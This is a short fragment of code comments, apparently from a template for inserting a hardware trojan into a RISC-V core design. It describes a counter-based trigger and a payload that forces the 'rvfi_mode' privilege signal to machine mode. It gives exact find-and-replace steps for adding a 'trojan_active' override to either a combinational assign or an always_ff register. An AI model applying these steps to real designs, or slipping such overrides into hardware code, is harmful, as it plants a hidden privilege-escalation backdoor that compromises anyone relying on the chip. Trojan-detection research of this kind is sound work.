 ...
 *   
 * Trigger: Counter on rvfi_mode
 * Payload: Force rvfi_mode to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override rvfi_mode to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If rvfi_mode has a combinational assign:
//   Find:    assign rvfi_mode = <priv_expr>;
//   Replace: assign rvfi_mode = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If rvfi_mode is updated inside always_ff:
//   Find the last assignment to rvfi_mode in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) rvfi_mode <= PRIV_LVL_M;
//
